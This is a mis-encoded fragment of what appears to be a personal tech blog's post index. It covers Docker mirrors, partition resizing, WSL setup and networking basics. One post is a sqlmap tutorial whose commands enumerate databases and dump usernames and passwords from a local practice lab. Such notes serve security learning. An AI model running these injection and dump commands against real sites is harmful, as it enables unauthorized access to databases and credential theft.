åˆæ¢Docker dockerå®˜æ–¹å®‰è£…ç½‘ç«™ æ±‰åŒ– ä¸‹è½½å¯¹åº”ç‰ˆæœ¬ä¸­æ–‡è¯­è¨€åŒ…ï¼š DockerDesktop-CN æ‰¾åˆ°dockerå®‰è£…ç›®å½•ï¼Œå¤‡ä»½å¹¶æ›¿æ¢asaræ–‡ä»¶ \\Docker\\Docker\\frontend\\resources é‡å¯è½¯ä»¶åå³å¯å‡ºç°æ±‰åŒ–ç•Œé¢ æ„é€ é•œåƒæ—¶æŠ¥é”™å¤„ç† ERROR [internal] load metadata for docker.io è¿™é‡Œé‡‡ç”¨æ›´æ¢é•œåƒæºçš„æ–¹æ³• åœ¨Docker å¼•æ“ä¸­jsonæ–‡ä»¶åŠ å…¥ï¼š registry-mirrors: [ https://docker.registry.cyou/, https://docker-cf.registry.cyou/, https://dockercf.jsdelivr.fyi/, https://docker.jsdelivr.fyi/, https://dockertest.jsdelivr.fyi/, https://mirror.aliyuncs.com/, https://dockerproxy.com/, https://mirror.baidubce.com/, https://docker.m.daocloud.io/, https://docker.nju.edu.cn/, https://docker.mirrors.sjtug.sjtu.edu.cn/, https://docker.mirrors.ustc.edu.cn/, https://mirror.iscas.ac.cn/, https://docker.rainbond.cc/, https://jq794zz5.mirror.aliyuncs.com ] å†ç”¨docker infoå‘½ä»¤æŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆ","tags":["Docker"],"categories":["Docker"]},{"title":"sqlmapè‡ªåŠ¨æ³¨å…¥","path":"/2025/07/16/sqlmapè‡ªåŠ¨æ³¨å…¥/","content":"sqlmapè‡ªåŠ¨æ³¨å…¥ å¸¸ç”¨å‚æ•° -uï¼šæ‰«æç›®æ ‡url --batchï¼šè‡ªåŠ¨å¤„ç†æç¤ºä¿¡æ¯ --cookieï¼šé™„åŠ cookieå‚æ•° è·å–å½“å‰æ•°æ®åº“åï¼š --current-dbï¼šæŸ¥è¯¢å½“å‰webä½¿ç”¨çš„æ•°æ®åº“å -Dï¼šåº”ç”¨æŒ‡å®šæ•°æ®åº“ è·å–è¡¨åï¼š --tablesï¼šæŸ¥è¯¢æŒ‡å®šåº“ä¸‹æ‰€æœ‰è¡¨åï¼ˆå…ˆç”¨-DæŒ‡å®šåº“åï¼‰ -Tï¼šåº”ç”¨æŒ‡å®šè¡¨ è·å–å­—æ®µï¼š --columnsï¼šæŸ¥è¯¢æŒ‡å®šè¡¨ä¸‹æ‰€æœ‰å­—æ®µï¼ˆå…ˆç”¨-TæŒ‡å®šåï¼‰ -Cï¼šåº”ç”¨æŒ‡å®šå­—æ®µå è·å–æ•°æ®ï¼š--dump GETä¼ å‚æ³¨å…¥ åŸºæœ¬çš„SQLæ³¨å…¥æ£€æµ‹,å¯ä»¥æ£€æµ‹æ³¨å…¥ç‚¹ä»¥åŠå¯æ³¨å…¥ç±»å‹python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batchæŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch --dbsæŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch --current-dbæŸ¥çœ‹è¡¨åpython sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security --tablesæŸ¥çœ‹è¡¨ä¸­çš„å­—æ®µpython sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security -T users --columnsæŸ¥çœ‹å­—æ®µä¸­çš„æ•°æ®python sqlmap.py -u http://127.0.0.1:8900/Less-7/?id=1 --batch -D security -T users -C id,username,password --dump POSTä¼ å‚æ³¨å…¥ å…ˆç”¨BpæŠ“åŒ…ï¼Œç„¶åä¿å­˜æŠ“å–çš„å†…å®¹åˆ°æ–‡ä»¶ä¹‹ä¸­ï¼ˆæˆ‘æ˜¯ä¿å­˜åœ¨C:/Users/ASUS/Desktop/1.txtï¼‰ ä¹‹åç›´æ¥ç”¨sqlmap -rï¼šæŒ‡å®šæ–‡ä»¶è·¯å¾„,ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–HTTPè¯·æ±‚ -p ï¼šæŒ‡å®šå‚æ•°å ï¼Œä¸åŠ på‚æ•°ä¼šè‡ªåŠ¨æ£€æµ‹æ³¨å…¥ç‚¹,ä¹Ÿå¯ä»¥å¾—åˆ°ç»“æœ,æŒ‡å®šæ³¨å…¥å‚æ•°åçš„è¯æ‰§è¡Œé€Ÿåº¦æ›´å¿« åŸºæœ¬çš„SQLæ³¨å…¥æ£€æµ‹,å¯ä»¥æ£€æµ‹æ³¨å…¥ç‚¹ä»¥åŠå¯æ³¨å…¥ç±»å‹python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwdæŸ¥çœ‹å½“å‰æ•°æ®åº“python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd --current-dbæŸ¥è¡¨python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security --tablesæŸ¥å­—æ®µpython sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security -T users --columnsæŸ¥æ•°æ®python sqlmap.py -r C:/Users/ASUS/Desktop/1.txt --batch -p passwd -D security -T users -C username,id,password --dump é£é™©å’Œæµ‹è¯•ç­‰çº§ riskï¼ˆé£é™©ç­‰çº§ï¼‰ é»˜è®¤ä¸º1ï¼ˆèŒƒå›´ï¼š1~3ï¼‰ risk è¶Šé«˜ï¼Œsqlmap ä¼šå°è¯•æ›´å…·é£é™©æ€§çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼ˆå¦‚ OR-based æ³¨å…¥ã€å †å æŸ¥è¯¢ç­‰ï¼‰ risk=3 å¯èƒ½å¯¼è‡´æ•°æ®è¢«ä¿®æ”¹æˆ–åˆ é™¤ï¼Œè°¨æ…ä½¿ç”¨ levelï¼ˆæµ‹è¯•ç­‰çº§ï¼‰ é»˜è®¤ä¸º1ï¼ˆèŒƒå›´ï¼š1~5ï¼‰ level è¶Šé«˜ï¼Œsqlmap ä¼šæµ‹è¯•æ›´å¤šçš„å‚æ•°ï¼ˆå¦‚ User-Agentã€Refererã€Cookieï¼‰å’Œæ›´å¤æ‚çš„ payload level=1ï¼ˆé»˜è®¤ï¼‰ï¼šä»…æµ‹è¯• GET å’Œ POST å‚æ•°ã€‚ level=2ï¼šå¢åŠ  Cookie å¤´æµ‹è¯•ã€‚ level=3ï¼šå¢åŠ  User-Agent å’Œ Referer æµ‹è¯•ã€‚ level=4ï¼šæµ‹è¯•æ‰€æœ‰ HTTP å¤´ï¼ˆå¦‚ X-Forwarded-Forï¼‰ã€‚ level=5ï¼šæµ‹è¯•æ‰€æœ‰å¯èƒ½çš„æ³¨å…¥ç‚¹ï¼ˆåŒ…æ‹¬ Host å¤´ï¼‰","tags":["CTFå·¥å…·","SQL","sqlmap"],"categories":["CTFå·¥å…·","sqlmap"]},{"title":"DiskGeniusæ— æŸè°ƒæ•´åˆ†åŒºå¤§å°","path":"/2025/07/15/DiskGeniusæ— æŸè°ƒæ•´åˆ†åŒºå¤§å°/","content":"DiskGeniusæ— æŸè°ƒæ•´åˆ†åŒºå¤§å° DiskGeniuså®˜ç½‘ä¸‹è½½ ç”±äºCç›˜çˆ†çº¢ï¼Œæˆ‘å†³å®šå°†æ— ç”¨çš„ç›˜çš„ç©ºé—´æ‰©å……ç»™Cç›˜ 1.é€‰ä¸­è¦è°ƒæ•´å¤§å°çš„åˆ†åŒºï¼Œç„¶åç‚¹å‡»é¼ æ ‡å³é”®ï¼Œåœ¨å¼¹å‡ºçš„èœå•ä¸­ï¼Œé€‰æ‹©â€œè°ƒæ•´åˆ†åŒºå¤§å°â€èœå•é¡¹ ä½†åœ¨è¿™è¾¹æˆ‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šæ— æ³•ç‚¹å‡»è°ƒæ•´åˆ†åŒºå¤§å° åŸå› åœ¨äºWindows11é»˜è®¤é‡‡ç”¨BitLockeråŠ å¯† æˆ‘ä»¬æ‰“å¼€è®¾ç½®ä¸­çš„éšç§ä¸å®‰å…¨ä¸­çš„è®¾å¤‡åŠ å¯†ï¼Œå…³æ‰è®¾å¤‡åŠ å¯† ä¹‹åå°±å¯ä»¥æ­£å¸¸è°ƒæ•´åˆ†åŒºå¤§å° è¦æƒ³å°†æŸåˆ†åŒºçš„å¤§å°æ‰©å¤§ï¼Œé€šå¸¸è¿˜è¦åŒæ—¶å°†å¦ä¸€ä¸ªåˆ†åŒºçš„å¤§å°ç¼©å°ã€‚è¦æƒ³å°†æŸä¸ªåˆ†åŒºçš„å¤§å°ç¼©å°ï¼Œåˆ™é€šå¸¸è¿˜è¦åŒæ—¶å°†å¦ä¸€ä¸ªåˆ†åŒºçš„å¤§å°æ‰©å¤§ åœ¨ä½¿ç”¨DiskGeniusè¿›è¡Œåˆ†åŒºè°ƒæ•´æ—¶ï¼Œåº”è¯¥é€‰æ‹©éœ€è¦è¢«è°ƒæ•´å°çš„åˆ†åŒº è½¯ä»¶å¼¹å‡ºâ€œè°ƒæ•´åˆ†åŒºå®¹é‡â€å¯¹è¯æ¡†ï¼Œå¯ä»¥è®¾ç½®å„ä¸ªåˆ†åŒºå¤§å°è°ƒæ•´é€‰é¡¹ æ‹–æ‹½åˆ†åŒºå‰éƒ¨æˆ–åéƒ¨ï¼Œè®¾ç½®éœ€è¦è°ƒæ•´çš„åˆ†åŒºå¤§å°ï¼Œç„¶ååœ¨ä¸‹æ‹‰æ¡†é€‰æ‹©å¦‚ä½•å¤„ç†è¿™éƒ¨åˆ†ç£ç›˜ç©ºé—´ åˆ†åŒºå‰éƒ¨çš„ç©ºé—´ä¸ºè¦ç»™å…¶ä»–ç›˜çš„ç©ºé—´ï¼Œè‡ªè¡Œåˆ†é…ï¼ˆä¸Šè¿°ä¸ºFç›˜è¦ç»™Cç›˜797.74MBçš„ç©ºé—´ï¼‰ 3.ç‚¹å‡»â€œå¼€å§‹â€æŒ‰é’®ï¼ŒDiskGeniusä¼šå…ˆæ˜¾ç¤ºä¸€ä¸ªæç¤ºçª—å£ï¼Œæ˜¾ç¤ºæœ¬æ¬¡æ— æŸåˆ†åŒºè°ƒæ•´çš„æ“ä½œæ­¥éª¤ä»¥åŠä¸€äº›æ³¨æ„äº‹é¡¹ ä¹‹åå°±ä¼šé‡å¯ç”µè„‘è‡ªåŠ¨æ“ä½œï¼ˆæ³¨æ„ä¸è¦åŠ¨ç”µè„‘ï¼Œå¦åˆ™ä¼šç›´æ¥é€€å‡ºæ“ä½œï¼Œåˆå¾—é‡æ¥ï¼‰ å®Œæˆä¹‹åå°±ä¼šå‘ç°Cç›˜æ•äº®å¤šäº†","tags":["Windows"],"categories":["Windows"]},{"title":"è®°ä¸€æ¬¡ç®€å•çš„kaliç½‘ç»œé—®é¢˜","path":"/2025/07/15/è®°ä¸€æ¬¡ç®€å•çš„kaliç½‘ç»œé—®é¢˜/","content":"è®°ä¸€æ¬¡ç®€å•çš„kaliç½‘ç»œé—®é¢˜ kaliè™šæ‹Ÿæœºè¿ä¸ä¸Šç½‘æ—¶å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•é‡ç½®ç½‘ç»œè¿æ¥ é¦–å…ˆåœ¨ç»ˆç«¯è¾“å…¥ifconfigï¼Œåªè¾“å‡ºä»¥ä¸‹è¯­å¥ è¯´æ˜æœªä¸ä¸»æœºå»ºç«‹è”ç³»ï¼Œæˆ‘ä»¬å°è¯•ç”¨sudo dhclient -vé‡ç½®ç½‘ç»œè¿æ¥ å†è¾“å…¥ifconfigï¼Œè¾“å‡ºä»¥ä¸‹å†…å®¹ä»£è¡¨ç½‘ç»œè¿æ¥æˆåŠŸï¼ˆå†è¿›ä¸€æ­¥è¿æ¥çš„è¯å¼€tunæ¨¡å¼ï¼‰","tags":["è™šæ‹Ÿæœº","kali"],"categories":["kali"]},{"title":"WSLè£…é…Ubuntu","path":"/2025/07/14/WSL è£…é…Ubuntu/","content":"WSL è£…é…Ubuntu å®˜æ–¹å®‰è£…WSLæ–‡æ¡£ wslï¼ˆWindows Subsystem for Linuxï¼‰å³é€‚ç”¨äºWindowsçš„Linuxå­ç³»ç»Ÿ å¼€å¯WindowsåŠŸèƒ½ åœ¨æ§åˆ¶é¢æ¿ä¸­æœç´¢ç¨‹åºï¼Œç‚¹å‡»å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½ åˆ’åˆ°åº•éƒ¨ï¼Œå‹¾é€‰é€‚ç”¨äºLinuxçš„Windowså­ç³»ç»Ÿå’Œè™šæ‹Ÿæœºå¹³å° å®‰è£…wsl2 ç®¡ç†å‘˜è¿è¡Œå‘½ä»¤çª—å£ï¼Œæ‰§è¡Œæ›´æ–°å‘½ä»¤ wsl --update æ‰§è¡Œå®‰è£…å‘½ä»¤ wsl --install è®¾ç½®é»˜è®¤ç‰ˆæœ¬ä¸ºwsl2 wsl --set-default-version 2 é‡å¯ä¸€ä¸‹ç”µè„‘ å®‰è£…Ubuntu åœ¨Microsoft storeä¸­å®‰è£…Ubuntuï¼Œè¿™é‡Œæˆ‘é€‰æ‹©24.04.1LTSç‰ˆæœ¬ï¼Œå®‰è£…åæ‰“å¼€å³å¯ ä½†æ˜¯è¿™é‡Œæˆ‘æ‰“å¼€ä¹‹åé‡åˆ°é”™è¯¯ï¼ˆæ®è¯´æ˜¯å¤©é€‰ç”µè„‘çš„é—®é¢˜ï¼‰ å‡ºç°äº†ï¼š Installing, this may take a few minutes... WslRegisterDistribution failed with error: 0x80370114 Error: 0x80370114 ?????????????????? WslRegisterDistribution failed é”™è¯¯é€šå¸¸æ˜¯ç”±äº WSLåœ¨å®‰è£…æˆ–å¯åŠ¨ Linux å‘è¡Œç‰ˆæ—¶å‡ºç°é—®é¢˜ è¿™é‡Œæˆ‘æ£é¼“äº†å¥½ä¹…ï¼Œç»ˆäºæ‰¾åˆ°ä¸€ä¸ªè§£å†³æ–¹æ³•ï¼š ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒPowerShell è¾“å…¥ï¼š Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux ä¹‹åé‡å¯ç”µè„‘åæ‰“å¼€Ubuntuï¼Œä¼šè®¾ç½®ç”¨æˆ·åå’Œå¯†ç  ä¹‹åè¦ä½¿ç”¨ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ wsl ~","tags":["è™šæ‹Ÿæœº","WSL"],"categories":["WSL"]},{"title":"ç½‘ç»œåè®®","path":"/2025/07/11/ç½‘ç»œåè®®/","content":"ç½‘ç»œåè®® æ¦‚è¿° å®šä¹‰ ç½‘ç»œåè®®æ˜¯è®¡ç®—æœºç½‘ç»œçš„æ ¸å¿ƒï¼Œå®ƒå®šä¹‰äº†è®¾å¤‡ä¹‹é—´å¦‚ä½•é€šä¿¡ï¼Œç¡®ä¿æ•°æ®èƒ½å¤Ÿæ­£ç¡®ã€é«˜æ•ˆã€å®‰å…¨åœ°ä¼ è¾“ã€‚æ— è®ºæ˜¯æµè§ˆç½‘é¡µã€å‘é€é‚®ä»¶è¿˜æ˜¯è§†é¢‘é€šè¯ï¼ŒèƒŒåéƒ½ç¦»ä¸å¼€ç½‘ç»œåè®®çš„æ”¯æŒ å¤§ç™½è¯ï¼šç½‘ç»œåè®®æ˜¯è®¾å¤‡é—´â€œäº¤æµçš„è¯­è¨€â€ åˆ†å±‚ç»“æ„ ç½‘ç»œåè®®é€šå¸¸æŒ‰ç…§åˆ†å±‚æ¨¡å‹ç»„ç»‡ï¼Œæœ€å¸¸è§çš„æ¨¡å‹æ˜¯ OSIä¸ƒå±‚æ¨¡å‹ å’Œ TCP/IPå››å±‚æ¨¡å‹ OSIä¸ƒå±‚æ¨¡å‹ ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰: è´Ÿè´£ä¼ è¾“åŸå§‹æ¯”ç‰¹æµï¼ˆå¦‚ç”µç¼†ã€å…‰çº¤ã€æ— çº¿ç”µæ³¢ï¼‰ æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰: è´Ÿè´£å°†æ•°æ®å°è£…æˆå¸§ï¼Œå¹¶åœ¨åŒä¸€ç½‘ç»œä¸­ä¼ è¾“ï¼ˆå¦‚ä»¥å¤ªç½‘åè®®ï¼‰ ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰: è´Ÿè´£æ•°æ®åŒ…çš„è·¯ç”±å’Œå¯»å€ï¼ˆå¦‚IPåè®®ï¼‰ ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰: è´Ÿè´£ç«¯åˆ°ç«¯çš„å¯é ä¼ è¾“ï¼ˆå¦‚TCPã€UDPåè®®ï¼‰ ä¼šè¯å±‚ï¼ˆSession Layerï¼‰: è´Ÿè´£å»ºç«‹ã€ç®¡ç†å’Œç»ˆæ­¢ä¼šè¯ï¼ˆå¦‚RPCåè®®ï¼‰ è¡¨ç¤ºå±‚ï¼ˆPresentation Layerï¼‰: è´Ÿè´£æ•°æ®çš„æ ¼å¼åŒ–å’ŒåŠ å¯†ï¼ˆå¦‚SSL/TLSåè®®ï¼‰ åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰: è´Ÿè´£æä¾›ç”¨æˆ·æ¥å£å’Œåº”ç”¨ç¨‹åºæœåŠ¡ï¼ˆå¦‚HTTPã€FTPåè®®ï¼‰ TCP/IPå››å±‚æ¨¡å‹ ç½‘ç»œæ¥å£å±‚ï¼ˆNetwork Interface Layerï¼‰: å¯¹åº”OSIçš„ç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚ ç½‘ç»œå±‚ï¼ˆInternet Layerï¼‰: å¯¹åº”OSIçš„ç½‘ç»œå±‚ï¼ˆå¦‚IPåè®®ï¼‰ ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰: å¯¹åº”OSIçš„ä¼ è¾“å±‚ï¼ˆå¦‚TCPã€UDPåè®®ï¼‰ åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰: å¯¹åº”OSIçš„åº”ç”¨å±‚ã€è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ï¼ˆå¦‚HTTPã€DNSåè®®ï¼‰ ç½‘ç»œé€šä¿¡åŸºç¡€ æ•°æ®åŒ…ã€å¸§ã€æŠ¥æ–‡ åœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼Œæ•°æ®è¢«åˆ†å‰²æˆå°å—è¿›è¡Œä¼ è¾“ï¼Œè¿™äº›å°å—è¢«ç§°ä¸ºæ•°æ®åŒ…ã€å¸§æˆ–æŠ¥æ–‡ï¼Œå…·ä½“åç§°å–å†³äºæ‰€åœ¨çš„ç½‘ç»œå±‚æ¬¡ æ•°æ®åŒ…ï¼ˆPacketï¼‰: åœ¨ç½‘ç»œå±‚ï¼ˆå¦‚IPåè®®ï¼‰ä¸­ï¼Œæ•°æ®è¢«å°è£…æˆæ•°æ®åŒ…ï¼ŒåŒ…å«æºåœ°å€ã€ç›®æ ‡åœ°å€å’Œæ•°æ®å†…å®¹ å¸§ï¼ˆFrameï¼‰: åœ¨æ•°æ®é“¾è·¯å±‚ï¼ˆå¦‚ä»¥å¤ªç½‘åè®®ï¼‰ä¸­ï¼Œæ•°æ®åŒ…è¢«è¿›ä¸€æ­¥å°è£…æˆå¸§ï¼ŒåŒ…å«MACåœ°å€å’Œé”™è¯¯æ£€æµ‹ä¿¡æ¯ æŠ¥æ–‡ï¼ˆMessageï¼‰: åœ¨åº”ç”¨å±‚ï¼ˆå¦‚HTTPåè®®ï¼‰ä¸­ï¼Œæ•°æ®ä»¥æŠ¥æ–‡çš„å½¢å¼ä¼ è¾“ï¼ŒåŒ…å«è¯·æ±‚æˆ–å“åº”çš„å…·ä½“å†…å®¹ ç½‘ç»œåœ°å€ IPåœ°å€ï¼ˆInternet Protocol Addressï¼‰ ç”¨äºæ ‡è¯†ç½‘ç»œä¸­çš„è®¾å¤‡ï¼Œåˆ†ä¸ºIPv4ï¼ˆå¦‚ 192.168.1.1ï¼‰å’ŒIPv6ï¼ˆå¦‚ 2001:0db8:85a3::8a2e:0370:7334ï¼‰ MACåœ°å€ï¼ˆMedia Access Control Addressï¼‰ ç”¨äºæ ‡è¯†ç½‘ç»œæ¥å£å¡ï¼ˆNICï¼‰ï¼Œæ˜¯ä¸€ä¸ªå”¯ä¸€çš„ç¡¬ä»¶åœ°å€ï¼Œæ ¼å¼ä¸º 00:1A:2B:3C:4D:5E [!CAUTION] IPåœ°å€ç›¸å½“äºå®¶åº­ä½å€ï¼ˆå¯å˜ï¼‰ MACåœ°å€ç›¸å½“äºèº«ä»½è¯å·ç ï¼ˆå›ºå®šï¼‰ ç«¯å£å·ä¸å¥—æ¥å­— ç«¯å£å·ï¼ˆPort Numberï¼‰ ç”¨äºæ ‡è¯†è®¾å¤‡ä¸Šçš„å…·ä½“åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼ŒèŒƒå›´æ˜¯ 0 åˆ° 65535 å¸¸è§ç«¯å£å·ï¼š HTTP: 80 HTTPS: 443 FTP: 21 SSH: 22 DNS: 53 å¥—æ¥å­—ï¼ˆSocketï¼‰ å¥—æ¥å­—æ˜¯ç½‘ç»œé€šä¿¡çš„ç«¯ç‚¹ï¼Œç”±IPåœ°å€å’Œç«¯å£å·ç»„æˆï¼ˆå¦‚ 192.168.1.1:80ï¼‰ å¥—æ¥å­—ç”¨äºå»ºç«‹è¿æ¥ã€å‘é€å’Œæ¥æ”¶æ•°æ® å¤§ç™½è¯ï¼šSocket æ˜¯è®©ä¸¤ä¸ªç¨‹åºé€šè¿‡ç½‘ç»œâ€œè¯´è¯â€çš„å·¥å…· ç½‘ç»œè®¾å¤‡ ç½‘ç»œé€šä¿¡ä¾èµ–äºå¤šç§è®¾å¤‡æ¥å®ç°æ•°æ®çš„ä¼ è¾“å’Œè·¯ç”± è·¯ç”±å™¨ï¼ˆRouterï¼‰: è´Ÿè´£åœ¨ä¸åŒç½‘ç»œä¹‹é—´è½¬å‘æ•°æ®åŒ…ï¼ŒåŸºäºIPåœ°å€è¿›è¡Œè·¯ç”±é€‰æ‹© äº¤æ¢æœºï¼ˆSwitchï¼‰: è´Ÿè´£åœ¨åŒä¸€ç½‘ç»œå†…è½¬å‘æ•°æ®å¸§ï¼ŒåŸºäºMACåœ°å€è¿›è¡Œæ•°æ®äº¤æ¢ ç½‘å…³ï¼ˆGatewayï¼‰: è¿æ¥ä¸åŒåè®®æˆ–ç½‘ç»œï¼Œå®ç°æ•°æ®æ ¼å¼çš„è½¬æ¢ è°ƒåˆ¶è§£è°ƒå™¨ï¼ˆModemï¼‰: å°†æ•°å­—ä¿¡å·è½¬æ¢ä¸ºæ¨¡æ‹Ÿä¿¡å·ï¼ˆå¦‚é€šè¿‡ç”µè¯çº¿ä¼ è¾“ï¼‰ ç½‘ç»œæ‹“æ‰‘ç»“æ„ ç½‘ç»œæ‹“æ‰‘ç»“æ„æè¿°äº†è®¾å¤‡ä¹‹é—´çš„è¿æ¥æ–¹å¼ æ˜Ÿå‹æ‹“æ‰‘ï¼ˆStar Topologyï¼‰ æ‰€æœ‰è®¾å¤‡è¿æ¥åˆ°ä¸€ä¸ªä¸­å¿ƒèŠ‚ç‚¹ï¼ˆå¦‚äº¤æ¢æœºï¼‰ ä¼˜ç‚¹ï¼šæ˜“äºç®¡ç†å’Œæ‰©å±• ç¼ºç‚¹ï¼šä¸­å¿ƒèŠ‚ç‚¹æ•…éšœä¼šå¯¼è‡´æ•´ä¸ªç½‘ç»œç˜«ç—ª æ€»çº¿å‹æ‹“æ‰‘ï¼ˆBus Topologyï¼‰ æ‰€æœ‰è®¾å¤‡è¿æ¥åˆ°ä¸€æ¡ä¸»å¹²çº¿ ä¼˜ç‚¹ï¼šæˆæœ¬ä½ ç¼ºç‚¹ï¼šä¸»å¹²çº¿æ•…éšœä¼šå½±å“æ•´ä¸ªç½‘ç»œ ç¯å‹æ‹“æ‰‘ï¼ˆRing Topologyï¼‰ è®¾å¤‡è¿æ¥æˆä¸€ä¸ªç¯å½¢ ä¼˜ç‚¹ï¼šæ•°æ®ä¼ è¾“æ•ˆç‡é«˜ ç¼ºç‚¹ï¼šå•ç‚¹æ•…éšœä¼šå½±å“æ•´ä¸ªç½‘ç»œ ç½‘çŠ¶æ‹“æ‰‘ï¼ˆMesh Topologyï¼‰ è®¾å¤‡ä¹‹é—´æœ‰å¤šæ¡è¿æ¥è·¯å¾„ ä¼˜ç‚¹ï¼šå¯é æ€§é«˜ ç¼ºç‚¹ï¼šæˆæœ¬é«˜ï¼Œç®¡ç†å¤æ‚ æ•°æ®ä¼ è¾“æ–¹å¼ å•æ’­ï¼ˆUnicastï¼‰: æ•°æ®ä»ä¸€å°è®¾å¤‡å‘é€åˆ°å¦ä¸€å°è®¾å¤‡ å¹¿æ’­ï¼ˆBroadcastï¼‰: æ•°æ®å‘é€åˆ°ç½‘ç»œä¸­çš„æ‰€æœ‰è®¾å¤‡ ç»„æ’­ï¼ˆMulticastï¼‰: æ•°æ®å‘é€åˆ°ä¸€ç»„ç‰¹å®šçš„è®¾å¤‡ ç½‘ç»œé€šä¿¡åŸºæœ¬æµç¨‹ æ•°æ®å°è£… åº”ç”¨å±‚ç”Ÿæˆæ•°æ®æŠ¥æ–‡ ä¼ è¾“å±‚æ·»åŠ ç«¯å£å·ï¼ˆTCP/UDPï¼‰ ç½‘ç»œå±‚æ·»åŠ IPåœ°å€ï¼ˆIPï¼‰ æ•°æ®é“¾è·¯å±‚æ·»åŠ MACåœ°å€ï¼ˆå¸§ï¼‰ ç‰©ç†å±‚å°†æ•°æ®è½¬æ¢ä¸ºæ¯”ç‰¹æµ æ•°æ®ä¼ è¾“ â€‹\tæ•°æ®é€šè¿‡ç‰©ç†ä»‹è´¨ï¼ˆå¦‚ç”µç¼†ã€å…‰çº¤ï¼‰ä¼ è¾“ æ•°æ®è§£å°è£… â€‹\tæ¥æ”¶è®¾å¤‡é€å±‚è§£ææ•°æ®ï¼Œæœ€ç»ˆå°†æ•°æ®ä¼ é€’ç»™ç›®æ ‡åº”ç”¨ç¨‹åº å¸¸è§ç½‘ç»œé€šä¿¡å·¥å…· Ping: æµ‹è¯•è®¾å¤‡ä¹‹é—´çš„è¿é€šæ€§ Traceroute: è·Ÿè¸ªæ•°æ®åŒ…çš„ä¼ è¾“è·¯å¾„ Wireshark: æŠ“å–å’Œåˆ†æç½‘ç»œæ•°æ®åŒ… Netstat: æŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ [!IMPORTANT] Netstatå‘½ä»¤åœ¨Windowsä¸­åº”ç”¨ä¸ºä¾‹ å‘½ä»¤ è¯´æ˜ netstat -a æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£ netstat -n ä»¥æ•°å­—æ–¹å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£ï¼ˆä¸è§£æåŸŸåï¼‰ netstat -oï¼ˆWindowsï¼‰ æ˜¾ç¤ºæ¯ä¸ªè¿æ¥å¯¹åº”çš„ è¿›ç¨‹IDï¼ˆPIDï¼‰ netstat -an åŒæ—¶æ˜¾ç¤ºæ•°å­—å½¢å¼å’Œå…¨éƒ¨è¿æ¥ netstat -anoï¼ˆWindowsï¼‰ æœ€å¸¸ç”¨ï¼æ˜¾ç¤ºæ‰€æœ‰è¿æ¥+ç«¯å£+PID netstat -s æ˜¾ç¤ºç½‘ç»œåè®®ç»Ÿè®¡ä¿¡æ¯ï¼ˆå¦‚ TCP/UDP æ”¶å‘ç»Ÿè®¡ï¼‰ netstat -r æ˜¾ç¤ºè·¯ç”±è¡¨ï¼ˆç­‰ä»·äº route printï¼‰ `netstat -an findstr ESTABLISHED ` `netstat -ano findstr :8080` `tasklist findstr 1234` åè®® FTPåè®® FTPï¼ˆFile Transfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“æ–‡ä»¶çš„åè®®ï¼Œå…¶å…è®¸ç”¨æˆ·ä»ä¸€å°è®¡ç®—æœºï¼ˆå®¢æˆ·ç«¯ï¼‰å‘å¦ä¸€å°è®¡ç®—æœºï¼ˆæœåŠ¡å™¨ï¼‰ä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ é»˜è®¤ç«¯å£21 SSHåè®® SSHï¼ˆSecure Shellï¼Œå®‰å…¨å¤–å£³åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå®‰å…¨è¿œç¨‹ç™»å½•å’Œå…¶ä»–ç½‘ç»œæœåŠ¡çš„åŠ å¯†åè®® SSH é€šè¿‡åŠ å¯†é€šä¿¡æ¥ä¿æŠ¤æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®‰å…¨æ€§ï¼Œå¹¿æ³›åº”ç”¨äºç³»ç»Ÿç®¡ç†ã€æ–‡ä»¶ä¼ è¾“å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œç­‰åœºæ™¯ é»˜è®¤ç«¯å£22 Telnetåè®® Telnet æ˜¯ä¸€ç§ç”¨äºè¿œç¨‹ç™»å½•çš„ç½‘ç»œåè®®ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç½‘ç»œè¿æ¥åˆ°è¿œç¨‹è®¡ç®—æœºå¹¶åœ¨å…¶ä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå…¶æ˜¯SSHåè®®çš„å‰èº« é»˜è®¤ç«¯å£23 TCPåè®® TCPï¼ˆTransmission Control 